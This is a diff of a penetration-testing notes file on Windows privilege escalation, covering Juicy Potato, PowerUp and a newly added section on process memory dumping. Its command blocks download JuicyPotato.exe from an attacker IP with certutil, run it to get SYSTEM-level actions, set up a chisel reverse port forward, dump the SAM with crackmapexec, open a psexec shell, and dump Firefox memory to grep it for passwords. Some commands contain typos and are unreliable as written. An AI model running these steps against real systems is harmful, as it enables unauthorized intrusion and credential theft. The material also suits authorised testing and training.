@@ -20,7 +20,7 @@ can create those tickets
 1. download windows-exploit-suggester.py
 
 1. generate xlsx data base
-    
+
     ```bash
     python3 windows-exploit-suggester.py --update
     ```
@@ -79,10 +79,11 @@ Juicy Potato is a local privilege escalation tool that exploit Windows service a
     - download JuicyPotato.exe and copy in the victim machine
     - create folder in `C:\Windows\Temp`
     - Transfer JuicyPotato to Windows Machine
-    
+
         ```powershell
         certutil.exe -f -urlcache -split http://10.10.10.10/JuicyPotato.exe JP.exe
         ```
+
     - Create user looping
 
         ```powershell
@@ -101,7 +102,7 @@ Juicy Potato is a local privilege escalation tool that exploit Windows service a
         ```powershell
         JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL"
         ```
-    
+
     - Update local account policy to gain access to the system
 
         ```powershell
@@ -123,6 +124,7 @@ Juicy Potato is a local privilege escalation tool that exploit Windows service a
             ```powershell
             chisel.exe client 10.10.10.10:1234 R:445:127.0.0.1:445
             ```
+
         - check if revert port forwarding works
 
             ```bash
@@ -130,25 +132,24 @@ Juicy Potato is a local privilege escalation tool that exploit Windows service a
             ```
 
         - check if looping is powned
-        
+
             ```bash
             crackmapexec smp -u 'looping' -p 'looping123!' --sam
 
             #OUTPUT
             SMB 127.0.0.1   445 MACHINENAME [*] machinename\looping:looping123! (Pwn3d!)
             ```
-    
+
     - Connect to machine with psexec.python
 
         ```bash
         locate psexex.py
         psexec.py WORKGROUP/looping@127.0.0.1 cmd.exe
         ```
-    
 
 ## System enumeration with PowerUp for Privesc {-}
 
-**PowerUp** is a script from the PowerSploit Library. PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration 
+**PowerUp** is a script from the PowerSploit Library. PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration
 testers during all phases of an assessment.
 
 [PowerSploit github](https://github.com/PowerShellMafia/PowerSploit)
@@ -172,7 +173,6 @@ testers during all phases of an assessment.
         knitr::include_graphics("images/sys-enum-powerup.png")
     ```
 
-
 In this example we can see that the UsoSvc is a Modifiable Service with an Invoke-ServiceAbuse function.
 
 Feel free now to check for an exploit on [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings).
@@ -180,3 +180,21 @@ Payloads for Windows and Active Directory are listed in the [Methodology and Res
 where you can find a **Windows - Privilege Escalation.md**.
 
 Search for UsoSvc to find what to do.
+
+## Checking running processes {-}
+
+On windows, with a powershell, you can check the running processes with the `get-process` command.
+If there is processes running that you want to focuse, juste use the `-name` argument.
+
+```bash
+get-process -name firefox
+```
+
+You have the possibility with a tool like `procdump.exe`, to dump process memory and then transfer the dump to your
+attacker machine.
+
+```bash
+.\procdump.exe -ma 1553 firefox.dmp
+```
+
+Transfer the **.dmp** file to the attacker machine and check the content with `strings -el firefox.dmp | grep password`
